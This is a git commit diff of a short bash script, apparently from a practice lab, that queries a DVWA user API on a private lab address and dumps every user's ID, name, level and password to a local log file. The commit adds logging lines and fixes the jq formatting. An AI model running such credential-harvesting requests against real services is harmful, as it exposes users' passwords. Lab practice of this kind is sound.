2156660e3b91867d295b486f57f64fdab17c3ee5
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 15:06:01 +0200

    Enhance user data retrieval with logging
    Added logging for user data retrieval process.

--- low_security_level.sh
+++ low_security_level.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
 
-( echo -e "ID\tName\tLevel\tPassword"
-curl -s http://192.168.56.105/DVWA/vulnerabilities/api/v1/user/ \
-| jq -r '.[] | "(.id)\t(.name)\t(.level)\t(.password)"'
-) > /home/kali/api_low.log
+{
+echo "Attempting to retrieve user data..."
+echo "---------------------------------------------------"
+echo -e "ID\tName\tLevel\tPassword"
+RESPONSE=$(curl -s \
+  http://192.168.56.105/DVWA/vulnerabilities/api/v1/user/)
+echo "$RESPONSE" | jq -r '.[] | "\(.id)\t\(.name)\t\(.level)\t\(.password)"'
+}> /home/kali/api_low.log
